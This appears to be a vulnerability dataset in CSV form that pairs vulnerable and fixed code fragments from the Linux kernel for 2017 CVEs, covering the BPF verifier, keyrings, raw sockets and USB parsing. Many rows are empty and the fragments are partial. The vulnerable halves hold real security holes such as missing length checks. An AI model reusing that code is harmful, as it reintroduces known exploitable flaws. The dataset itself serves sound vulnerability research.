static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
 struct bpf_insn *insn,
 struct bpf_reg_state *dst_reg,
 bool src_known, dst_known;
	s64 smin_val, smax_val;
	u64 umin_val, umax_val;


 if (BPF_CLASS(insn->code) != BPF_ALU64) {
 /* 32-bit ALU ops are (32,32)->64 */
 coerce_reg_to_size(dst_reg, 4);
 coerce_reg_to_size(&src_reg, 4);
	}
	smin_val = src_reg.smin_value;
	smax_val = src_reg.smax_value;
	umin_val = src_reg.umin_value;
 __update_reg_bounds(dst_reg);
 break;
 case BPF_LSH:
 if (umax_val > 63) {
 /* Shifts greater than 63 are undefined.  This includes
			 * shifts by a negative number.
 */
 mark_reg_unknown(env, regs, insn->dst_reg);
 break;
 __update_reg_bounds(dst_reg);
 break;
 case BPF_RSH:
 if (umax_val > 63) {
 /* Shifts greater than 63 are undefined.  This includes
			 * shifts by a negative number.
 */
 mark_reg_unknown(env, regs, insn->dst_reg);
 break;
 break;
	}







 __reg_deduce_bounds(dst_reg);
 __reg_bound_offset(dst_reg);
 return 0;
"," return 0;
}

/* WARNING: This function does calculations on 64-bit values, but the actual
 * execution may occur on 32-bit values. Therefore, things like bitshifts
 * need extra checks in the 32-bit case.
 */
static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
 struct bpf_insn *insn,
 struct bpf_reg_state *dst_reg,
 bool src_known, dst_known;
	s64 smin_val, smax_val;
	u64 umin_val, umax_val;
	u64 insn_bitness = (BPF_CLASS(insn->code) == BPF_ALU64) ? 64 : 32;






	smin_val = src_reg.smin_value;
	smax_val = src_reg.smax_value;
	umin_val = src_reg.umin_value;
 __update_reg_bounds(dst_reg);
 break;
 case BPF_LSH:
 if (umax_val >= insn_bitness) {
 /* Shifts greater than 31 or 63 are undefined.
			 * This includes shifts by a negative number.
 */
 mark_reg_unknown(env, regs, insn->dst_reg);
 break;
 __update_reg_bounds(dst_reg);
 break;
 case BPF_RSH:
 if (umax_val >= insn_bitness) {
 /* Shifts greater than 31 or 63 are undefined.
			 * This includes shifts by a negative number.
 */
 mark_reg_unknown(env, regs, insn->dst_reg);
 break;
 break;
	}

 if (BPF_CLASS(insn->code) != BPF_ALU64) {
 /* 32-bit ALU ops are (32,32)->32 */
 coerce_reg_to_size(dst_reg, 4);
 coerce_reg_to_size(&src_reg, 4);
	}

 __reg_deduce_bounds(dst_reg);
 __reg_bound_offset(dst_reg);
 return 0;
"
2017,,CVE-2017-17807," * The keyring selected is returned with an extra reference upon it which the
 * caller must release.
 */
static void construct_get_dest_keyring(struct key **_dest_keyring)
{
 struct request_key_auth *rka;
 const struct cred *cred = current_cred();
 struct key *dest_keyring = *_dest_keyring, *authkey;


 kenter(""%p"", dest_keyring);

 /* the caller supplied one */
 key_get(dest_keyring);
	} else {


 /* use a default keyring; falling through the cases until we
		 * find one that we actually have */
 switch (cred->jit_keyring) {
					dest_keyring =
 key_get(rka->dest_keyring);
 up_read(&authkey->sem);
 if (dest_keyring)

 break;

			}

 case KEY_REQKEY_DEFL_THREAD_KEYRING:
 default:
 BUG();
		}


















	}

	*_dest_keyring = dest_keyring;
 kleave("" [dk %d]"", key_serial(dest_keyring));
 return;
}

/*
 if (ctx->index_key.type == &key_type_keyring)
 return ERR_PTR(-EPERM);

 user = key_user_lookup(current_fsuid());
 if (!user)
 return ERR_PTR(-ENOMEM);

 construct_get_dest_keyring(&dest_keyring);





	ret = construct_alloc_key(ctx, dest_keyring, flags, user, &key);
 key_user_put(user);
	} else if (ret == -EINPROGRESS) {
		ret = 0;
	} else {
 goto couldnt_alloc_key;
	}

 key_put(dest_keyring);
construction_failed:
 key_negate_and_link(key, key_negative_timeout, NULL, NULL);
 key_put(key);
couldnt_alloc_key:
 key_put(dest_keyring);

 kleave("" = %d"", ret);
 return ERR_PTR(ret);
}
"," * The keyring selected is returned with an extra reference upon it which the
 * caller must release.
 */
static int construct_get_dest_keyring(struct key **_dest_keyring)
{
 struct request_key_auth *rka;
 const struct cred *cred = current_cred();
 struct key *dest_keyring = *_dest_keyring, *authkey;
 int ret;

 kenter(""%p"", dest_keyring);

 /* the caller supplied one */
 key_get(dest_keyring);
	} else {
 bool do_perm_check = true;

 /* use a default keyring; falling through the cases until we
		 * find one that we actually have */
 switch (cred->jit_keyring) {
					dest_keyring =
 key_get(rka->dest_keyring);
 up_read(&authkey->sem);
 if (dest_keyring) {
					do_perm_check = false;
 break;
				}
			}

 case KEY_REQKEY_DEFL_THREAD_KEYRING:
 default:
 BUG();
		}

 /*
		 * Require Write permission on the keyring.  This is essential
		 * because the default keyring may be the session keyring, and
		 * joining a keyring only requires Search permission.
		 *
		 * However, this check is skipped for the ""requestor keyring"" so
		 * that /sbin/request-key can itself use request_key() to add
		 * keys to the original requestor's destination keyring.
 */
 if (dest_keyring && do_perm_check) {
			ret = key_permission(make_key_ref(dest_keyring, 1),
					     KEY_NEED_WRITE);
 if (ret) {
 key_put(dest_keyring);
 return ret;
			}
		}
	}

	*_dest_keyring = dest_keyring;
 kleave("" [dk %d]"", key_serial(dest_keyring));
 return 0;
}

/*
 if (ctx->index_key.type == &key_type_keyring)
 return ERR_PTR(-EPERM);

 ret = construct_get_dest_keyring(&dest_keyring);
 if (ret)
 goto error;

	user = key_user_lookup(current_fsuid());
 if (!user) {
		ret = -ENOMEM;
 goto error_put_dest_keyring;
	}

	ret = construct_alloc_key(ctx, dest_keyring, flags, user, &key);
 key_user_put(user);
	} else if (ret == -EINPROGRESS) {
		ret = 0;
	} else {
 goto error_put_dest_keyring;
	}

 key_put(dest_keyring);
construction_failed:
 key_negate_and_link(key, key_negative_timeout, NULL, NULL);
 key_put(key);
error_put_dest_keyring:
 key_put(dest_keyring);
error:
 kleave("" = %d"", ret);
 return ERR_PTR(ret);
}
"
2017,Overflow ,CVE-2017-17806,"	salg = shash_attr_alg(tb[1], 0, 0);
 if (IS_ERR(salg))
 return PTR_ERR(salg);



	err = -EINVAL;



	ds = salg->digestsize;
	ss = salg->statesize;
	alg = &salg->base;
 if (ds > alg->cra_blocksize ||
	    ss < alg->cra_blocksize)
 goto out_put_alg;

static const struct crypto_type crypto_shash_type;

static int shash_no_setkey(struct crypto_shash *tfm, const u8 *key,
   unsigned int keylen)
{
 return -ENOSYS;
}


static int shash_setkey_unaligned(struct crypto_shash *tfm, const u8 *key,
 unsigned int keylen)
 struct ahash_instance *inst);
void ahash_free_instance(struct crypto_instance *inst);









int crypto_init_ahash_spawn(struct crypto_ahash_spawn *spawn,
 struct hash_alg_common *alg,
 struct crypto_instance *inst);
","	salg = shash_attr_alg(tb[1], 0, 0);
 if (IS_ERR(salg))
 return PTR_ERR(salg);
	alg = &salg->base;

 /* The underlying hash algorithm must be unkeyed */
	err = -EINVAL;
 if (crypto_shash_alg_has_setkey(salg))
 goto out_put_alg;

	ds = salg->digestsize;
	ss = salg->statesize;

 if (ds > alg->cra_blocksize ||
	    ss < alg->cra_blocksize)
 goto out_put_alg;

static const struct crypto_type crypto_shash_type;

int shash_no_setkey(struct crypto_shash *tfm, const u8 *key,
   unsigned int keylen)
{
 return -ENOSYS;
}
EXPORT_SYMBOL_GPL(shash_no_setkey);

static int shash_setkey_unaligned(struct crypto_shash *tfm, const u8 *key,
 unsigned int keylen)
 struct ahash_instance *inst);
void ahash_free_instance(struct crypto_instance *inst);

int shash_no_setkey(struct crypto_shash *tfm, const u8 *key,
 unsigned int keylen);

static inline bool crypto_shash_alg_has_setkey(struct shash_alg *alg)
{
 return alg->setkey != shash_no_setkey;
}

int crypto_init_ahash_spawn(struct crypto_ahash_spawn *spawn,
 struct hash_alg_common *alg,
 struct crypto_instance *inst);
"
2017,DoS ,CVE-2017-17805,"
 salsa20_ivsetup(ctx, walk.iv);

 if (likely(walk.nbytes == nbytes))
	{
 salsa20_encrypt_bytes(ctx, walk.src.virt.addr,
				      walk.dst.virt.addr, nbytes);
 return blkcipher_walk_done(desc, &walk, 0);
	}

 while (walk.nbytes >= 64) {
 salsa20_encrypt_bytes(ctx, walk.src.virt.addr,
				      walk.dst.virt.addr,

 salsa20_ivsetup(ctx, walk.iv);

 if (likely(walk.nbytes == nbytes))
	{
 salsa20_encrypt_bytes(ctx, walk.dst.virt.addr,
				      walk.src.virt.addr, nbytes);
 return blkcipher_walk_done(desc, &walk, 0);
	}

 while (walk.nbytes >= 64) {
 salsa20_encrypt_bytes(ctx, walk.dst.virt.addr,
				      walk.src.virt.addr,
","
 salsa20_ivsetup(ctx, walk.iv);








 while (walk.nbytes >= 64) {
 salsa20_encrypt_bytes(ctx, walk.src.virt.addr,
				      walk.dst.virt.addr,

 salsa20_ivsetup(ctx, walk.iv);








 while (walk.nbytes >= 64) {
 salsa20_encrypt_bytes(ctx, walk.dst.virt.addr,
				      walk.src.virt.addr,
"
2017,#NAME?,CVE-2017-17741,,
2017,Exec Code +Priv ,CVE-2017-17712," int err;
 struct ip_options_data opt_copy;
 struct raw_frag_vec rfv;


	err = -EMSGSIZE;
 if (len > 0xFFFF)
 goto out;





 /*
	 *	Check the flags.
 */
 /* Linux does not mangle headers on raw sockets,
		 * so that IP options + IP_HDRINCL is non-sense.
 */
 if (inet->hdrincl)
 goto done;
 if (ipc.opt->opt.srr) {
 if (!daddr)

 flowi4_init_output(&fl4, ipc.oif, sk->sk_mark, tos,
			   RT_SCOPE_UNIVERSE,
 inet->hdrincl ? IPPROTO_RAW : sk->sk_protocol,
 inet_sk_flowi_flags(sk) |
			    (inet->hdrincl ? FLOWI_FLAG_KNOWN_NH : 0),
			   daddr, saddr, 0, 0, sk->sk_uid);

 if (!inet->hdrincl) {
		rfv.msg = msg;
		rfv.hlen = 0;

 goto do_confirm;
back_from_confirm:

 if (inet->hdrincl)
		err = raw_send_hdrinc(sk, &fl4, msg, len,
				      &rt, msg->msg_flags, &ipc.sockc);

"," int err;
 struct ip_options_data opt_copy;
 struct raw_frag_vec rfv;
 int hdrincl;

	err = -EMSGSIZE;
 if (len > 0xFFFF)
 goto out;

 /* hdrincl should be READ_ONCE(inet->hdrincl)
	 * but READ_ONCE() doesn't work with bit fields
 */
	hdrincl = inet->hdrincl;
 /*
	 *	Check the flags.
 */
 /* Linux does not mangle headers on raw sockets,
		 * so that IP options + IP_HDRINCL is non-sense.
 */
 if (hdrincl)
 goto done;
 if (ipc.opt->opt.srr) {
 if (!daddr)

 flowi4_init_output(&fl4, ipc.oif, sk->sk_mark, tos,
			   RT_SCOPE_UNIVERSE,
			   hdrincl ? IPPROTO_RAW : sk->sk_protocol,
 inet_sk_flowi_flags(sk) |
			    (hdrincl ? FLOWI_FLAG_KNOWN_NH : 0),
			   daddr, saddr, 0, 0, sk->sk_uid);

 if (!hdrincl) {
		rfv.msg = msg;
		rfv.hlen = 0;

 goto do_confirm;
back_from_confirm:

 if (hdrincl)
		err = raw_send_hdrinc(sk, &fl4, msg, len,
				      &rt, msg->msg_flags, &ipc.sockc);

"
2017,DoS ,CVE-2017-17558,,
2017,Bypass ,CVE-2017-17450,,
2017,#NAME?,CVE-2017-17449,,
2017,Bypass ,CVE-2017-17448,,
2017,,CVE-2017-17053,"		mm->context.execute_only_pkey = -1;
	}
	#endif
 init_new_context_ldt(tsk, mm);

 return 0;
}
static inline void destroy_context(struct mm_struct *mm)
{
","		mm->context.execute_only_pkey = -1;
	}
	#endif
 return init_new_context_ldt(tsk, mm);


}
static inline void destroy_context(struct mm_struct *mm)
{
"
2017,,CVE-2017-17052," mm_init_cpumask(mm);
 mm_init_aio(mm);
 mm_init_owner(mm, p);

 mmu_notifier_mm_init(mm);
 init_tlb_flush_pending(mm);
#if defined(CONFIG_TRANSPARENT_HUGEPAGE) && !USE_SPLIT_PMD_PTLOCKS
"," mm_init_cpumask(mm);
 mm_init_aio(mm);
 mm_init_owner(mm, p);
 RCU_INIT_POINTER(mm->exe_file, NULL);
 mmu_notifier_mm_init(mm);
 init_tlb_flush_pending(mm);
#if defined(CONFIG_TRANSPARENT_HUGEPAGE) && !USE_SPLIT_PMD_PTLOCKS
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-16996,"					   strict);
}
























/* check whether memory at (regno + off) is accessible for t = (read | write)
 * if t==write, value_regno is a register which value is stored into memory
 * if t==read, value_regno is a register which will receive the value from memory
 if (!err && size < BPF_REG_SIZE && value_regno >= 0 && t == BPF_READ &&
	    regs[value_regno].type == SCALAR_VALUE) {
 /* b/h/w load zero-extends, mark upper bits as known 0 */
		regs[value_regno].var_off =
 tnum_cast(regs[value_regno].var_off, size);
 __update_reg_bounds(&regs[value_regno]);
	}
 return err;
}
 return 0;
}

static void coerce_reg_to_32(struct bpf_reg_state *reg)
{
 /* clear high 32 bits */
	reg->var_off = tnum_cast(reg->var_off, 4);
 /* Update bounds */
 __update_reg_bounds(reg);
}

static bool signed_add_overflows(s64 a, s64 b)
{
 /* Do the add in u64, where overflow is well-defined */

 if (BPF_CLASS(insn->code) != BPF_ALU64) {
 /* 32-bit ALU ops are (32,32)->64 */
 coerce_reg_to_32(dst_reg);
 coerce_reg_to_32(&src_reg);
	}
	smin_val = src_reg.smin_value;
	smax_val = src_reg.smax_value;
 return -EACCES;
				}
 mark_reg_unknown(env, regs, insn->dst_reg);
 /* high 32 bits are known zero. */
				regs[insn->dst_reg].var_off = tnum_cast(
						regs[insn->dst_reg].var_off, 4);
 __update_reg_bounds(&regs[insn->dst_reg]);
			}
		} else {
 /* case: R = imm
","					   strict);
}

/* truncate register to smaller size (in bytes)
 * must be called with size < BPF_REG_SIZE
 */
static void coerce_reg_to_size(struct bpf_reg_state *reg, int size)
{
	u64 mask;

 /* clear high bits in bit representation */
	reg->var_off = tnum_cast(reg->var_off, size);

 /* fix arithmetic bounds */
	mask = ((u64)1 << (size * 8)) - 1;
 if ((reg->umin_value & ~mask) == (reg->umax_value & ~mask)) {
		reg->umin_value &= mask;
		reg->umax_value &= mask;
	} else {
		reg->umin_value = 0;
		reg->umax_value = mask;
	}
	reg->smin_value = reg->umin_value;
	reg->smax_value = reg->umax_value;
}

/* check whether memory at (regno + off) is accessible for t = (read | write)
 * if t==write, value_regno is a register which value is stored into memory
 * if t==read, value_regno is a register which will receive the value from memory
 if (!err && size < BPF_REG_SIZE && value_regno >= 0 && t == BPF_READ &&
	    regs[value_regno].type == SCALAR_VALUE) {
 /* b/h/w load zero-extends, mark upper bits as known 0 */
 coerce_reg_to_size(&regs[value_regno], size);


	}
 return err;
}
 return 0;
}









static bool signed_add_overflows(s64 a, s64 b)
{
 /* Do the add in u64, where overflow is well-defined */

 if (BPF_CLASS(insn->code) != BPF_ALU64) {
 /* 32-bit ALU ops are (32,32)->64 */
 coerce_reg_to_size(dst_reg, 4);
 coerce_reg_to_size(&src_reg, 4);
	}
	smin_val = src_reg.smin_value;
	smax_val = src_reg.smax_value;
 return -EACCES;
				}
 mark_reg_unknown(env, regs, insn->dst_reg);
 coerce_reg_to_size(&regs[insn->dst_reg], 4);



			}
		} else {
 /* case: R = imm
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-16995,"			 * remember the value we stored into this reg
 */
			regs[insn->dst_reg].type = SCALAR_VALUE;
 __mark_reg_known(regs + insn->dst_reg, insn->imm);






		}

	} else if (opcode > BPF_END) {
","			 * remember the value we stored into this reg
 */
			regs[insn->dst_reg].type = SCALAR_VALUE;
 if (BPF_CLASS(insn->code) == BPF_ALU64) {
 __mark_reg_known(regs + insn->dst_reg,
						 insn->imm);
			} else {
 __mark_reg_known(regs + insn->dst_reg,
						 (u32)insn->imm);
			}
		}

	} else if (opcode > BPF_END) {
"
2017,#NAME?,CVE-2017-16994," do {
		next = hugetlb_entry_end(h, addr, end);
		pte = huge_pte_offset(walk->mm, addr & hmask, sz);
 if (pte && walk->hugetlb_entry)

			err = walk->hugetlb_entry(pte, hmask, addr, next, walk);



 if (err)
 break;
	} while (addr = next, addr != end);
"," do {
		next = hugetlb_entry_end(h, addr, end);
		pte = huge_pte_offset(walk->mm, addr & hmask, sz);

 if (pte)
			err = walk->hugetlb_entry(pte, hmask, addr, next, walk);
 else if (walk->pte_hole)
			err = walk->pte_hole(addr, next, walk);

 if (err)
 break;
	} while (addr = next, addr != end);
"
2017,DoS +Priv ,CVE-2017-16939,"
static int xfrm_dump_policy_done(struct netlink_callback *cb)
{
 struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *) &cb->args[1];
 struct net *net = sock_net(cb->skb->sk);

 xfrm_policy_walk_done(walk, net);
 return 0;
}











static int xfrm_dump_policy(struct sk_buff *skb, struct netlink_callback *cb)
{
 struct net *net = sock_net(skb->sk);
 struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *) &cb->args[1];
 struct xfrm_dump_info info;

 BUILD_BUG_ON(sizeof(struct xfrm_policy_walk) >
 sizeof(cb->args) - sizeof(cb->args[0]));

	info.in_skb = cb->skb;
	info.out_skb = skb;
	info.nlmsg_seq = cb->nlh->nlmsg_seq;
	info.nlmsg_flags = NLM_F_MULTI;

 if (!cb->args[0]) {
		cb->args[0] = 1;
 xfrm_policy_walk_init(walk, XFRM_POLICY_TYPE_ANY);
	}

	(void) xfrm_policy_walk(net, walk, dump_one_policy, &info);

 return skb->len;

static const struct xfrm_link {
 int (*doit)(struct sk_buff *, struct nlmsghdr *, struct nlattr **);

 int (*dump)(struct sk_buff *, struct netlink_callback *);
 int (*done)(struct netlink_callback *);
 const struct nla_policy *nla_pol;
	[XFRM_MSG_NEWPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
	[XFRM_MSG_DELPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy    },
	[XFRM_MSG_GETPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy,

						   .dump = xfrm_dump_policy,
						   .done = xfrm_dump_policy_done },
	[XFRM_MSG_ALLOCSPI    - XFRM_MSG_BASE] = { .doit = xfrm_alloc_userspi },

		{
 struct netlink_dump_control c = {

				.dump = link->dump,
				.done = link->done,
			};
","
static int xfrm_dump_policy_done(struct netlink_callback *cb)
{
 struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;
 struct net *net = sock_net(cb->skb->sk);

 xfrm_policy_walk_done(walk, net);
 return 0;
}

static int xfrm_dump_policy_start(struct netlink_callback *cb)
{
 struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;

 BUILD_BUG_ON(sizeof(*walk) > sizeof(cb->args));

 xfrm_policy_walk_init(walk, XFRM_POLICY_TYPE_ANY);
 return 0;
}

static int xfrm_dump_policy(struct sk_buff *skb, struct netlink_callback *cb)
{
 struct net *net = sock_net(skb->sk);
 struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;
 struct xfrm_dump_info info;




	info.in_skb = cb->skb;
	info.out_skb = skb;
	info.nlmsg_seq = cb->nlh->nlmsg_seq;
	info.nlmsg_flags = NLM_F_MULTI;






	(void) xfrm_policy_walk(net, walk, dump_one_policy, &info);

 return skb->len;

static const struct xfrm_link {
 int (*doit)(struct sk_buff *, struct nlmsghdr *, struct nlattr **);
 int (*start)(struct netlink_callback *);
 int (*dump)(struct sk_buff *, struct netlink_callback *);
 int (*done)(struct netlink_callback *);
 const struct nla_policy *nla_pol;
	[XFRM_MSG_NEWPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
	[XFRM_MSG_DELPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy    },
	[XFRM_MSG_GETPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy,
						   .start = xfrm_dump_policy_start,
						   .dump = xfrm_dump_policy,
						   .done = xfrm_dump_policy_done },
	[XFRM_MSG_ALLOCSPI    - XFRM_MSG_BASE] = { .doit = xfrm_alloc_userspi },

		{
 struct netlink_dump_control c = {
				.start = link->start,
				.dump = link->dump,
				.done = link->done,
			};
"
2018,DoS ,CVE-2017-16914,,
2018,DoS Overflow ,CVE-2017-16913,,
2018,DoS ,CVE-2017-16912,,
2018,#NAME?,CVE-2017-16911,,
2017,DoS ,CVE-2017-16650,,
2017,DoS ,CVE-2017-16649,,
2017,DoS ,CVE-2017-16648,,
2017,DoS ,CVE-2017-16647,,
2017,DoS ,CVE-2017-16646,,
2017,DoS ,CVE-2017-16645," return NULL;
	}

 while (buflen > 0) {
		union_desc = (struct usb_cdc_union_desc *)buf;






 if (union_desc->bDescriptorType == USB_DT_CS_INTERFACE &&
		    union_desc->bDescriptorSubType == USB_CDC_UNION_TYPE) {
 dev_dbg(&intf->dev, ""Found union header\n"");
 return union_desc;







		}

		buflen -= union_desc->bLength;
"," return NULL;
	}

 while (buflen >= sizeof(*union_desc)) {
		union_desc = (struct usb_cdc_union_desc *)buf;

 if (union_desc->bLength > buflen) {
 dev_err(&intf->dev, ""Too large descriptor\n"");
 return NULL;
		}

 if (union_desc->bDescriptorType == USB_DT_CS_INTERFACE &&
		    union_desc->bDescriptorSubType == USB_CDC_UNION_TYPE) {
 dev_dbg(&intf->dev, ""Found union header\n"");

 if (union_desc->bLength >= sizeof(*union_desc))
 return union_desc;

 dev_err(&intf->dev,
 ""Union descriptor to short (%d vs %zd\n)"",
				union_desc->bLength, sizeof(*union_desc));
 return NULL;
		}

		buflen -= union_desc->bLength;
"
2017,DoS ,CVE-2017-16644,,
2017,DoS ,CVE-2017-16643,"
 /* Walk  this report and pull out the info we need */
 while (i < length) {
		prefix = report[i];

 /* Skip over prefix */
		i++;

 /* Determine data size and save the data in the proper variable */
		size = PREF_SIZE(prefix);







 switch (size) {
 case 1:
			data = report[i];
 break;
 case 2:
			data16 = get_unaligned_le16(&report[i]);
 break;
 case 3:
			size = 4;
			data32 = get_unaligned_le32(&report[i]);
 break;
		}
","
 /* Walk  this report and pull out the info we need */
 while (i < length) {
		prefix = report[i++];




 /* Determine data size and save the data in the proper variable */
		size = (1U << PREF_SIZE(prefix)) >> 1;
 if (i + size > length) {
 dev_err(ddev,
 ""Not enough data (need %d, have %d)\n"",
				i + size, length);
 break;
		}

 switch (size) {
 case 1:
			data = report[i];
 break;
 case 2:
			data16 = get_unaligned_le16(&report[i]);
 break;
 case 4:

			data32 = get_unaligned_le32(&report[i]);
 break;
		}
"
2017,DoS ,CVE-2017-16538,,
2017,DoS ,CVE-2017-16537,,
2017,DoS ,CVE-2017-16536,,
2017,DoS ,CVE-2017-16535," for (i = 0; i < num; i++) {
		buffer += length;
		cap = (struct usb_dev_cap_header *)buffer;
		length = cap->bLength;

 if (total_len < length)

 break;


		total_len -= length;

 if (cap->bDescriptorType != USB_DT_DEVICE_CAPABILITY) {
"," for (i = 0; i < num; i++) {
		buffer += length;
		cap = (struct usb_dev_cap_header *)buffer;


 if (total_len < sizeof(*cap) || total_len < cap->bLength) {
			dev->bos->desc->bNumDeviceCaps = i;
 break;
		}
		length = cap->bLength;
		total_len -= length;

 if (cap->bDescriptorType != USB_DT_DEVICE_CAPABILITY) {
"
2017,DoS Overflow ,CVE-2017-16534,"			elength = 1;
 goto next_desc;
		}




 if (buffer[1] != USB_DT_CS_INTERFACE) {
 dev_err(&intf->dev, ""skipping garbage\n"");
 goto next_desc;
","			elength = 1;
 goto next_desc;
		}
 if ((buflen < elength) || (elength < 3)) {
 dev_err(&intf->dev, ""invalid descriptor buffer length\n"");
 break;
		}
 if (buffer[1] != USB_DT_CS_INTERFACE) {
 dev_err(&intf->dev, ""skipping garbage\n"");
 goto next_desc;
"
2017,DoS ,CVE-2017-16533," unsigned int rsize = 0;
 char *rdesc;
 int ret, n;



	quirks = usbhid_lookup_quirk(le16_to_cpu(dev->descriptor.idVendor),
 le16_to_cpu(dev->descriptor.idProduct));
 return -ENODEV;
	}






	hid->version = le16_to_cpu(hdesc->bcdHID);
	hid->country = hdesc->bCountryCode;

 for (n = 0; n < hdesc->bNumDescriptors; n++)



 if (hdesc->desc[n].bDescriptorType == HID_DT_REPORT)
			rsize = le16_to_cpu(hdesc->desc[n].wDescriptorLength);

"," unsigned int rsize = 0;
 char *rdesc;
 int ret, n;
 int num_descriptors;
 size_t offset = offsetof(struct hid_descriptor, desc);

	quirks = usbhid_lookup_quirk(le16_to_cpu(dev->descriptor.idVendor),
 le16_to_cpu(dev->descriptor.idProduct));
 return -ENODEV;
	}

 if (hdesc->bLength < sizeof(struct hid_descriptor)) {
 dbg_hid(""hid descriptor is too short\n"");
 return -EINVAL;
	}

	hid->version = le16_to_cpu(hdesc->bcdHID);
	hid->country = hdesc->bCountryCode;

	num_descriptors = min_t(int, hdesc->bNumDescriptors,
	       (hdesc->bLength - offset) / sizeof(struct hid_class_descriptor));

 for (n = 0; n < num_descriptors; n++)
 if (hdesc->desc[n].bDescriptorType == HID_DT_REPORT)
			rsize = le16_to_cpu(hdesc->desc[n].wDescriptorLength);

"
2017,DoS ,CVE-2017-16532," return tmp;
	}

 if (in) {
		dev->in_pipe = usb_rcvbulkpipe(udev,
			in->desc.bEndpointAddress & USB_ENDPOINT_NUMBER_MASK);

		dev->out_pipe = usb_sndbulkpipe(udev,
			out->desc.bEndpointAddress & USB_ENDPOINT_NUMBER_MASK);
	}
 if (iso_in) {
		dev->iso_in = &iso_in->desc;
		dev->in_iso_pipe = usb_rcvisocpipe(udev,
"," return tmp;
	}

 if (in)
		dev->in_pipe = usb_rcvbulkpipe(udev,
			in->desc.bEndpointAddress & USB_ENDPOINT_NUMBER_MASK);
 if (out)
		dev->out_pipe = usb_sndbulkpipe(udev,
			out->desc.bEndpointAddress & USB_ENDPOINT_NUMBER_MASK);

 if (iso_in) {
		dev->iso_in = &iso_in->desc;
		dev->in_iso_pipe = usb_rcvisocpipe(udev,
"
2017,DoS Overflow ,CVE-2017-16531,"
		} else if (header->bDescriptorType ==
				USB_DT_INTERFACE_ASSOCIATION) {










 if (iad_num == USB_MAXIADS) {
 dev_warn(ddev, ""found more Interface ""
 ""Association Descriptors ""
 ""than allocated for in ""
 ""configuration %d\n"", cfgno);
			} else {
				config->intf_assoc[iad_num] =
					(struct usb_interface_assoc_descriptor
					*)header;
				iad_num++;
			}

	__u8  iFunction;
} __attribute__ ((packed));



/*-------------------------------------------------------------------------*/

","
		} else if (header->bDescriptorType ==
				USB_DT_INTERFACE_ASSOCIATION) {
 struct usb_interface_assoc_descriptor *d;

			d = (struct usb_interface_assoc_descriptor *)header;
 if (d->bLength < USB_DT_INTERFACE_ASSOCIATION_SIZE) {
 dev_warn(ddev,
 ""config %d has an invalid interface association descriptor of length %d, skipping\n"",
					 cfgno, d->bLength);
 continue;
			}

 if (iad_num == USB_MAXIADS) {
 dev_warn(ddev, ""found more Interface ""
 ""Association Descriptors ""
 ""than allocated for in ""
 ""configuration %d\n"", cfgno);
			} else {
				config->intf_assoc[iad_num] = d;


				iad_num++;
			}

	__u8  iFunction;
} __attribute__ ((packed));

#define USB_DT_INTERFACE_ASSOCIATION_SIZE 8

/*-------------------------------------------------------------------------*/

"
2017,DoS ,CVE-2017-16530,"		intf->desc.bInterfaceProtocol == USB_PR_UAS);
}

static int uas_find_uas_alt_setting(struct usb_interface *intf)

{
 int i;

 for (i = 0; i < intf->num_altsetting; i++) {
 struct usb_host_interface *alt = &intf->altsetting[i];

 if (uas_is_interface(alt))
 return alt->desc.bAlternateSetting;
	}

 return -ENODEV;
}

static int uas_find_endpoints(struct usb_host_interface *alt,
 struct usb_device *udev = interface_to_usbdev(intf);
 struct usb_hcd *hcd = bus_to_hcd(udev->bus);
 unsigned long flags = id->driver_info;
 int r, alt;


	alt = uas_find_uas_alt_setting(intf);
 if (alt < 0)
 return 0;

	r = uas_find_endpoints(&intf->altsetting[alt], eps);
 if (r < 0)
 return 0;

static int uas_switch_interface(struct usb_device *udev,
 struct usb_interface *intf)
{
 int alt;

	alt = uas_find_uas_alt_setting(intf);
 if (alt < 0)
 return alt;

 return usb_set_interface(udev,
 intf->altsetting[0].desc.bInterfaceNumber, alt);
}

static int uas_configure_endpoints(struct uas_dev_info *devinfo)
","		intf->desc.bInterfaceProtocol == USB_PR_UAS);
}

static struct usb_host_interface *uas_find_uas_alt_setting(
 struct usb_interface *intf)
{
 int i;

 for (i = 0; i < intf->num_altsetting; i++) {
 struct usb_host_interface *alt = &intf->altsetting[i];

 if (uas_is_interface(alt))
 return alt;
	}

 return NULL;
}

static int uas_find_endpoints(struct usb_host_interface *alt,
 struct usb_device *udev = interface_to_usbdev(intf);
 struct usb_hcd *hcd = bus_to_hcd(udev->bus);
 unsigned long flags = id->driver_info;
 struct usb_host_interface *alt;
 int r;

	alt = uas_find_uas_alt_setting(intf);
 if (!alt)
 return 0;

	r = uas_find_endpoints(alt, eps);
 if (r < 0)
 return 0;

static int uas_switch_interface(struct usb_device *udev,
 struct usb_interface *intf)
{
 struct usb_host_interface *alt;

	alt = uas_find_uas_alt_setting(intf);
 if (!alt)
 return -ENODEV;

 return usb_set_interface(udev, alt->desc.bInterfaceNumber,
 alt->desc.bAlternateSetting);
}

static int uas_configure_endpoints(struct uas_dev_info *devinfo)
"
2017,DoS ,CVE-2017-16529," struct usb_interface_descriptor *altsd;
 void *control_header;
 int i, protocol;


 /* find audiocontrol interface */
	host_iface = &usb_ifnum_to_if(dev, ctrlif)->altsetting[0];
 return -EINVAL;
	}










 switch (protocol) {
 default:
 dev_warn(&dev->dev,
 case UAC_VERSION_1: {
 struct uac1_ac_header_descriptor *h1 = control_header;






 if (!h1->bInCollection) {
 dev_info(&dev->dev, ""skipping empty audio interface (v1)\n"");
 return -EINVAL;
		}






 if (h1->bLength < sizeof(*h1) + h1->bInCollection) {
 dev_err(&dev->dev, ""invalid UAC_HEADER (v1)\n"");
 return -EINVAL;
"," struct usb_interface_descriptor *altsd;
 void *control_header;
 int i, protocol;
 int rest_bytes;

 /* find audiocontrol interface */
	host_iface = &usb_ifnum_to_if(dev, ctrlif)->altsetting[0];
